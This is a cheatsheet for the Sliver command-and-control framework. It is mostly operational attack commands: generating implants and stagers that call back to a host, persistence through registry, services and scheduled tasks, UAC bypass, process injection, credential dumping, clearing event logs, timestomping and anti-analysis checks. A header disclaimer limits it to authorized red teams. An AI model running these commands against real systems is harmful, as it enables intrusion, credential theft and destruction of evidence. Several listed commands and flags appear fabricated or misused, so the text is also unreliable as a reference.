# Sliver C2 Framework Complete Cheatsheet

> **For authorized red team exercises and penetration testing only. Unauthorized use is illegal.**

---

## Table of Contents

- [Installation & Setup](#installation--setup)
- [Server Management](#server-management)
- [Implant Generation](#implant-generation)
- [Session Management](#session-management)
- [Post-Exploitation](#post-exploitation)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)
- [Privilege Escalation](#privilege-escalation)
- [Process Operations](#process-operations)
- [File Operations](#file-operations)
- [Network Operations](#network-operations)
- [Registry Operations](#registry-operations)
- [Credentials & Secrets](#credentials--secrets)
- [Steganography & Evasion](#steganography--evasion)
- [Extensions & Modules](#extensions--modules)
- [Multiplayer Mode](#multiplayer-mode)
- [OPSEC Considerations](#opsec-considerations)
- [Advanced Techniques](#advanced-techniques)

---

## Installation & Setup

### Quick Installation

```bash
# Linux/macOS - using install script
curl https://sliver.sh/install | sudo bash

# Manual installation - download release
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Start Sliver server
sliver-server
```

### Building from Source

```bash
# Clone repository
git clone https://github.com/BishopFox/sliver.git
cd sliver

# Build server
make

# Build client
make client

# Install
sudo make install
```

### Docker Installation

```bash
# Pull Docker image
docker pull ghcr.io/bishopfox/sliver:latest

# Run container
docker run -it --rm -p 31337:31337 -p 8888:8888 ghcr.io/bishopfox/sliver:latest

# With persistent data
docker run -it --rm -v /opt/sliver:/opt/sliver -p 31337:31337 -p 8888:8888 ghcr.io/bishopfox/sliver:latest
```

---

## Server Management

### Basic Server Operations

```bash
# Start Sliver server
sliver-server

# Start with custom config
sliver-server -c /path/to/config.json

# Daemon mode
sliver-server daemon

# Debug mode
sliver-server -d

# Specify log level
sliver-server -l debug
```

### Configuration Management

```bash
# View current configuration
sliver > settings

# Set log level
sliver > settings logs-level debug

# Set beacon interval
sliver > settings beacon-interval 60s

# Set jitter
sliver > settings beacon-jitter 30s

# Save settings
sliver > settings save
```

### Listener Management

```bash
# Start HTTP listener
sliver > http --lhost 0.0.0.0 --lport 80

# Start HTTPS listener
sliver > https --lhost 0.0.0.0 --lport 443

# Start DNS listener
sliver > dns --domains example.com --lhost 0.0.0.0

# Start TCP listener
sliver > tcp --lhost 0.0.0.0 --lport 4444

# Start mTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Start WireGuard listener
sliver > wg --lhost 0.0.0.0 --lport 53

# List active jobs
sliver > jobs

# Stop job
sliver > jobs -k <job_id>
```

---

## Implant Generation

### Basic Implant Generation

```bash
# Generate basic HTTP beacon
sliver > generate --http example.com --save /tmp/beacon

# Generate HTTPS beacon
sliver > generate --https example.com:443 --save /tmp/beacon

# Generate DNS beacon
sliver > generate --dns example.com --save /tmp/beacon

# Generate mTLS session
sliver > generate --mtls example.com:8888 --save /tmp/session

# Generate with custom name
sliver > generate --http example.com --name MyImplant --save /tmp/
```

### Advanced Generation Options

```bash
# Windows executable
sliver > generate --http example.com --os windows --arch amd64 --format exe --save /tmp/

# Linux executable
sliver > generate --http example.com --os linux --arch amd64 --format elf --save /tmp/

# macOS executable  
sliver > generate --http example.com --os darwin --arch amd64 --format macho --save /tmp/

# Windows DLL
sliver > generate --http example.com --os windows --arch amd64 --format shared --save /tmp/

# Windows service
sliver > generate --http example.com --os windows --arch amd64 --format service --save /tmp/

# Shellcode
sliver > generate --http example.com --os windows --arch amd64 --format shellcode --save /tmp/
```

### Beacon vs Session Configuration

```bash
# Session (interactive) - immediate callback
sliver > generate --mtls example.com:8888 --save /tmp/session

# Beacon (staged) - periodic callback
sliver > generate --http example.com --save /tmp/beacon

# Custom beacon interval
sliver > generate --http example.com --beacon-interval 120s --save /tmp/

# Custom jitter
sliver > generate --http example.com --beacon-jitter 30s --save /tmp/

# Kill date
sliver > generate --http example.com --kill-date "2024-12-31 23:59:59" --save /tmp/
```

### Stager Generation

```bash
# Generate stager (small downloader)
sliver > generate stager --http example.com --os windows --arch amd64 --format exe --save /tmp/

# PowerShell stager
sliver > generate stager --http example.com --os windows --arch amd64 --format powershell --save /tmp/

# Bash stager
sliver > generate stager --http example.com --os linux --arch amd64 --format bash --save /tmp/
```

### Evasion & Obfuscation

```bash
# Disable SGN (Shikata Ga Nai) obfuscation
sliver > generate --http example.com --disable-sgn --save /tmp/

# Skip symbols
sliver > generate --http example.com --skip-symbols --save /tmp/

# Custom template
sliver > generate --http example.com --template /path/to/template --save /tmp/

# Pack with UPX
sliver > generate --http example.com --upx --save /tmp/
```

---

## Session Management

### Basic Session Commands

```bash
# List sessions
sliver > sessions

# Use session
sliver > use <session_id>

# Get session info
sliver (session) > info

# Background session
sliver (session) > background

# Kill session
sliver > sessions -k <session_id>

# Kill all sessions
sliver > sessions -K

# Rename session
sliver > sessions -i <session_id> -n <new_name>
```

### Beacon Management

```bash
# List beacons
sliver > beacons

# Use beacon
sliver > use <beacon_id>

# Get beacon info
sliver (beacon) > info

# Task beacon
sliver (beacon) > tasks

# Cancel task
sliver (beacon) > cancel <task_id>

# Interactive mode (convert beacon to session)
sliver (beacon) > interactive

# Set beacon interval
sliver (beacon) > set-beacon-interval 60s

# Set jitter
sliver (beacon) > set-beacon-jitter 10s
```

---

## Post-Exploitation

### System Information

```bash
# Basic system info
sliver (session) > info

# Detailed system info
sliver (session) > getgid
sliver (session) > getpid
sliver (session) > getuid

# Environment variables
sliver (session) > env

# Network information
sliver (session) > ifconfig
sliver (session) > netstat

# Process list
sliver (session) > ps

# Process tree
sliver (session) > ps -T

# System architecture
sliver (session) > getarch

# Operating system
sliver (session) > getos
```

### Command Execution

```bash
# Execute command
sliver (session) > execute hostname

# Execute with arguments
sliver (session) > execute notepad.exe -a "C:\temp\file.txt"

# Execute and save output
sliver (session) > execute whoami -o /tmp/output.txt

# Execute in background
sliver (session) > execute ping 8.8.8.8 -t 0

# Shell access
sliver (session) > shell

# PowerShell
sliver (session) > powershell

# Interactive shell
sliver (session) > shell -i
```

### Screen & Monitoring

```bash
# Screenshot
sliver (session) > screenshot

# Save screenshot to file
sliver (session) > screenshot -s /tmp/screen.png

# Start screen stream
sliver (session) > start-screen-stream

# Stop screen stream  
sliver (session) > stop-screen-stream
```

---

## Lateral Movement

### Network Discovery

```bash
# Ping sweep
sliver (session) > ping 192.168.1.1/24

# Port scan
sliver (session) > portscan 192.168.1.100 --ports 80,443,22,3389

# TCP connect scan
sliver (session) > portscan 192.168.1.100 --tcp --ports 1-1000

# Service detection
sliver (session) > portscan 192.168.1.100 --service-detection

# Stealth scan
sliver (session) > portscan 192.168.1.100 --stealth
```

### Remote Execution

```bash
# WMI execution
sliver (session) > wmi-exec -H 192.168.1.100 -u Administrator -p password123 -c "whoami"

# PsExec execution
sliver (session) > psexec -H 192.168.1.100 -u Administrator -p password123 -c "cmd.exe"

# Remote service execution
sliver (session) > service-exec -H 192.168.1.100 -u Administrator -p password123 -s "malicious_service" -c "C:\temp\beacon.exe"
```

### Credential Usage

```bash
# Pass-the-hash
sliver (session) > make-token -u Administrator -d DOMAIN -n <ntlm_hash>

# Use Kerberos ticket
sliver (session) > make-token -u Administrator -d DOMAIN -t <base64_ticket>

# Revert token
sliver (session) > rev2self
```

### Pivoting

```bash
# Start SOCKS proxy
sliver (session) > socks5 start

# Start on specific port
sliver (session) > socks5 start -P 1080

# Stop SOCKS proxy
sliver (session) > socks5 stop

# Port forwarding
sliver (session) > portfwd add --remote-addr 192.168.1.100 --remote-port 3389 --local-port 13389

# List port forwards
sliver (session) > portfwd list

# Remove port forward
sliver (session) > portfwd rm --local-port 13389
```

---

## Persistence

### Registry Persistence

```bash
# Current user run key
sliver (session) > registry write --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Updater" --value "C:\temp\beacon.exe"

# Local machine run key (requires admin)
sliver (session) > registry write --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "SecurityUpdate" --value "C:\Windows\System32\beacon.exe"

# RunOnce key
sliver (session) > registry write --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\RunOnce" --key "Update" --value "C:\temp\beacon.exe"
```

### Service Persistence

```bash
# Create Windows service
sliver (session) > execute sc create MyService binPath= "C:\Windows\System32\beacon.exe" start= auto

# Start service
sliver (session) > execute sc start MyService

# Query service
sliver (session) > execute sc query MyService

# Delete service
sliver (session) > execute sc delete MyService
```

### Scheduled Task Persistence

```bash
# Create scheduled task
sliver (session) > execute schtasks /create /tn "WindowsUpdate" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Create task with trigger
sliver (session) > execute schtasks /create /tn "Backup" /tr "C:\temp\beacon.exe" /sc daily /st 09:00

# List tasks
sliver (session) > execute schtasks /query

# Delete task
sliver (session) > execute schtasks /delete /tn "WindowsUpdate" /f
```

### WMI Persistence

```bash
# WMI event subscription (requires admin)
sliver (session) > wmi-persistence install --event-name "UserLogon" --script "C:\temp\beacon.exe"

# Remove WMI persistence
sliver (session) > wmi-persistence remove --event-name "UserLogon"

# List WMI persistence
sliver (session) > wmi-persistence list
```

---

## Privilege Escalation

### Token Operations

```bash
# List available tokens
sliver (session) > get-tokens

# Impersonate token
sliver (session) > impersonate <token_id>

# Revert to original token
sliver (session) > rev2self

# Make token from credentials
sliver (session) > make-token -u Administrator -p password123 -d DOMAIN
```

### Process Migration

```bash
# List processes
sliver (session) > ps

# Migrate to process
sliver (session) > migrate <pid>

# Migrate to specific process by name
sliver (session) > migrate -n explorer.exe

# Spawn and migrate
sliver (session) > spawn-dll <dll_path> <process_name>
```

### UAC Bypass

```bash
# FodHelper UAC bypass
sliver (session) > uac-bypass fodhelper "C:\temp\beacon.exe"

# ComputerDefaults UAC bypass
sliver (session) > uac-bypass computerdefaults "C:\temp\beacon.exe"

# EventVwr UAC bypass
sliver (session) > uac-bypass eventvwr "C:\temp\beacon.exe"
```

---

## Process Operations

### Process Management

```bash
# List processes
sliver (session) > ps

# Detailed process info
sliver (session) > ps -v

# Filter processes
sliver (session) > ps -f notepad

# Process tree
sliver (session) > ps -T

# Kill process
sliver (session) > terminate <pid>

# Kill process by name
sliver (session) > terminate -n notepad.exe
```

### Process Injection

```bash
# DLL injection
sliver (session) > dll-inject -p <pid> -d /path/to/dll

# Shellcode injection
sliver (session) > shellcode-inject -p <pid> -s /path/to/shellcode

# Process hollowing
sliver (session) > hollow -p <target_process> -r /path/to/replacement

# Reflective DLL loading
sliver (session) > execute-assembly /path/to/assembly.exe
```

### Memory Operations

```bash
# Memory dump
sliver (session) > memdump -p <pid> -o /tmp/dump.dmp

# Read process memory
sliver (session) > memread -p <pid> -a <address> -s <size>

# Write process memory
sliver (session) > memwrite -p <pid> -a <address> -d <data>

# Find pattern in memory
sliver (session) > memfind -p <pid> -x "4D5A"
```

---

## File Operations

### File Management

```bash
# List files
sliver (session) > ls

# Change directory
sliver (session) > cd C:\temp

# Current directory
sliver (session) > pwd

# Make directory
sliver (session) > mkdir test_dir

# Remove directory
sliver (session) > rmdir test_dir

# Remove file
sliver (session) > rm file.txt
```

### File Transfer

```bash
# Download file
sliver (session) > download C:\temp\file.txt /tmp/

# Upload file
sliver (session) > upload /tmp/payload.exe C:\temp\

# Recursive download
sliver (session) > download -r C:\temp\ /tmp/temp_backup/

# Upload with progress
sliver (session) > upload -p /large_file.zip C:\temp\
```

### File Operations

```bash
# View file content
sliver (session) > cat C:\temp\file.txt

# Grep in file
sliver (session) > grep "password" C:\temp\config.txt

# Find files
sliver (session) > find C:\ -name "*.txt"

# File checksum
sliver (session) > checksum C:\temp\file.exe

# File permissions
sliver (session) > chmod 755 /tmp/script.sh
```

---

## Network Operations

### Network Information

```bash
# Network interfaces
sliver (session) > ifconfig

# Routing table
sliver (session) > route

# Network connections
sliver (session) > netstat

# ARP table
sliver (session) > arp

# DNS resolution
sliver (session) > nslookup google.com

# Test connectivity
sliver (session) > ping 8.8.8.8
```

### Network Scanning

```bash
# Port scan single host
sliver (session) > portscan 192.168.1.100

# Port scan with specific ports
sliver (session) > portscan 192.168.1.100 --ports 80,443,22

# TCP connect scan
sliver (session) > portscan 192.168.1.1/24 --tcp

# UDP scan
sliver (session) > portscan 192.168.1.100 --udp --ports 53,161

# Stealth scan
sliver (session) > portscan 192.168.1.100 --stealth --ports 1-1000
```

### Traffic Capture

```bash
# Start packet capture
sliver (session) > packet-capture start -i eth0

# Capture to file
sliver (session) > packet-capture start -i eth0 -o /tmp/capture.pcap

# Stop capture
sliver (session) > packet-capture stop

# List captures
sliver (session) > packet-capture list
```

---

## Registry Operations

### Registry Access

```bash
# List registry keys
sliver (session) > registry list --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion"

# Read registry value
sliver (session) > registry read --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "test"

# Write registry value
sliver (session) > registry write --hive HKCU --path "Software\Test" --key "value1" --value "data"

# Delete registry key
sliver (session) > registry delete --hive HKCU --path "Software\Test" --key "value1"

# Create registry key
sliver (session) > registry create --hive HKCU --path "Software\NewKey"
```

### Common Registry Locations

```bash
# Startup programs
sliver (session) > registry list --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run"

# Installed software
sliver (session) > registry list --hive HKLM --path "Software\Microsoft\Windows\CurrentVersion\Uninstall"

# Services
sliver (session) > registry list --hive HKLM --path "System\CurrentControlSet\Services"

# User profiles
sliver (session) > registry list --hive HKLM --path "Software\Microsoft\Windows NT\CurrentVersion\ProfileList"
```

---

## Credentials & Secrets

### Credential Harvesting

```bash
# Dump SAM database
sliver (session) > hashdump

# Dump cached credentials
sliver (session) > dcsync -d domain.com -u Administrator

# LSASS dump
sliver (session) > lsass-dump

# Kerberos tickets
sliver (session) > kerberoast

# ASREPRoast attack
sliver (session) > asreproast
```

### Browser Credentials

```bash
# Chrome passwords
sliver (session) > chrome-dump

# Firefox passwords  
sliver (session) > firefox-dump

# Edge passwords
sliver (session) > edge-dump

# All browsers
sliver (session) > browser-dump
```

### Windows Credential Manager

```bash
# Enumerate stored credentials
sliver (session) > credman enum

# Dump specific credential
sliver (session) > credman dump --target "WindowsLive:target=virtualapp/didlogical"

# List all credentials
sliver (session) > credman list
```

---

## Steganography & Evasion

### Traffic Evasion

```bash
# Domain fronting
sliver > generate --http cdn.example.com --canaries google.com,amazon.com --save /tmp/

# Custom User-Agent
sliver > generate --http example.com --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --save /tmp/

# Session key encryption
sliver > generate --http example.com --session-key <32-byte-key> --save /tmp/

# Custom headers
sliver > generate --http example.com --header "X-Custom: value" --save /tmp/
```

### Process Evasion

```bash
# Process migration after execution
sliver (session) > migrate -n svchost.exe

# Hide process
sliver (session) > hide-process

# Unhide process
sliver (session) > unhide-process

# Process masquerading
sliver (session) > masquerade -n explorer.exe
```

### Anti-Forensics

```bash
# Clear event logs
sliver (session) > execute wevtutil cl System
sliver (session) > execute wevtutil cl Security
sliver (session) > execute wevtutil cl Application

# Timestomp files
sliver (session) > timestomp C:\temp\beacon.exe -m "01/01/2020 12:00:00"

# Secure delete
sliver (session) > sdelete C:\temp\evidence.txt
```

---

## Extensions & Modules

### BOF (Beacon Object Files)

```bash
# Load BOF
sliver (session) > bof load /path/to/object.o

# Execute BOF
sliver (session) > bof exec object_name arg1 arg2

# List loaded BOFs
sliver (session) > bof list

# Unload BOF
sliver (session) > bof unload object_name
```

### Extensions

```bash
# Load extension
sliver > load extension /path/to/extension.dll

# List extensions
sliver > extensions

# Extension help
sliver > help <extension_name>

# Unload extension
sliver > unload extension extension_name
```

### Third-Party Tools

```bash
# Load Mimikatz
sliver (session) > mimikatz

# Execute .NET assembly
sliver (session) > execute-assembly /path/to/Rubeus.exe

# Inline C# execution
sliver (session) > inline-csharp "Console.WriteLine(\"Hello World\");"

# PowerShell script
sliver (session) > powershell-script /path/to/script.ps1
```

---

## Multiplayer Mode

### Team Server Setup

```bash
# Generate operator config
sliver-server operator --name alice --lhost <server_ip>

# Start team server
sliver-server daemon --lhost 0.0.0.0

# Import operator config (client)
sliver-client import alice.cfg

# Connect to team server
sliver-client
```

### Multiplayer Commands

```bash
# List operators
sliver > operators

# Send message to operators
sliver > msg "Hello team"

# Share session
sliver > sessions share <session_id> <operator_name>

# Transfer session ownership
sliver > sessions transfer <session_id> <operator_name>

# View session history
sliver > history --session <session_id>
```

---

## OPSEC Considerations

### Configuration Best Practices

```bash
# Use legitimate-looking domains
sliver > generate --http legitimate-domain.com --save /tmp/

# Randomize beacon timing
sliver > generate --http example.com --beacon-interval 300s --beacon-jitter 120s --save /tmp/

# Set kill date
sliver > generate --http example.com --kill-date "2024-12-31 23:59:59" --save /tmp/

# Custom certificates
sliver > https --cert /path/to/cert.pem --key /path/to/key.pem
```

### Process OPSEC

```bash
# Migrate to trusted process immediately
sliver (session) > migrate -n svchost.exe

# Use living-off-the-land binaries
sliver (session) > execute rundll32.exe C:\Windows\System32\shell32.dll,ShellExec_RunDLL

# Avoid suspicious locations
# Good: C:\Windows\System32\
# Bad: C:\temp\, C:\Users\Public\
```

### Network OPSEC

```bash
# Use HTTPS with valid certificates
sliver > https --lhost 0.0.0.0 --lport 443 --cert /path/to/valid-cert.pem

# Domain fronting
sliver > generate --http cdn.cloudflare.com --domain-fronting target.com --save /tmp/

# Custom malleable profiles
sliver > generate --http example.com --c2profile /path/to/profile.profile --save /tmp/
```

---

## Advanced Techniques

### Custom C2 Profiles

```json
{
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  "headers": {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate"
  },
  "url_paths": ["/search", "/images", "/news"],
  "beacon_interval": "60s",
  "beacon_jitter": "10s"
}
```

### Automation Scripts

```bash
#!/bin/bash
# Auto-deployment script

# Start listeners
sliver-client -c "http --lhost 0.0.0.0 --lport 80"
sliver-client -c "https --lhost 0.0.0.0 --lport 443"

# Generate payloads
sliver-client -c "generate --http example.com --save /tmp/http_beacon"
sliver-client -c "generate --https example.com --save /tmp/https_beacon"

echo "Payloads generated in /tmp/"
```

### Evasion Techniques

```bash
# Anti-VM checks
sliver (session) > execute wmic computersystem get model
sliver (session) > execute systeminfo | findstr "System Model"

# Anti-debugging
sliver (session) > execute tasklist | findstr "wireshark\|procmon\|ollydbg"

# Check for analysis tools
sliver (session) > execute dir "C:\Program Files" | findstr "IDA\|Ghidra\|x64dbg"
```

### Persistence Combinations

```bash
# Multi-vector persistence
sliver (session) > registry write --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" --key "Update" --value "C:\Windows\System32\beacon.exe"
sliver (session) > execute schtasks /create /tn "Backup" /tr "C:\Windows\System32\beacon.exe" /sc daily /st 02:00
sliver (session) > execute sc create SysUpdate binPath= "C:\Windows\System32\beacon.exe" start= auto
```

---

## Troubleshooting

### Common Issues

```bash
# Session connectivity issues
sliver > sessions --clean  # Remove dead sessions

# Beacon not calling back
sliver > beacons --clean   # Clean dead beacons

# Check listener status
sliver > jobs               # View active listeners

# Restart listeners
sliver > jobs -k <job_id>   # Kill listener
sliver > http               # Restart HTTP listener
```

### Debug Mode

```bash
# Enable debug logging
sliver > settings logs-level debug

# View logs
sliver > logs

# Session debugging
sliver (session) > info --debug

# Network debugging
sliver (session) > netstat --verbose
```

---

## Quick Reference Commands

### Essential Commands
```bash
# Server management
sliver-server                    # Start server
sliver-client                    # Connect client
sessions                         # List sessions
beacons                         # List beacons
use <session_id>                # Use session
background                      # Background session

# Listeners
http                            # Start HTTP listener
https                           # Start HTTPS listener
mtls                            # Start mTLS listener
dns                             # Start DNS listener

# Generation
generate                        # Generate implant
generate stager                 # Generate stager

# Post-exploitation
info                            # System info
ps                              # Process list
ls                              # List files
download                        # Download file
upload                          # Upload file
shell                           # Interactive shell
execute                         # Execute command
```

---

*This cheatsheet is for authorized security testing only. Always ensure proper authorization and follow responsible disclosure practices.*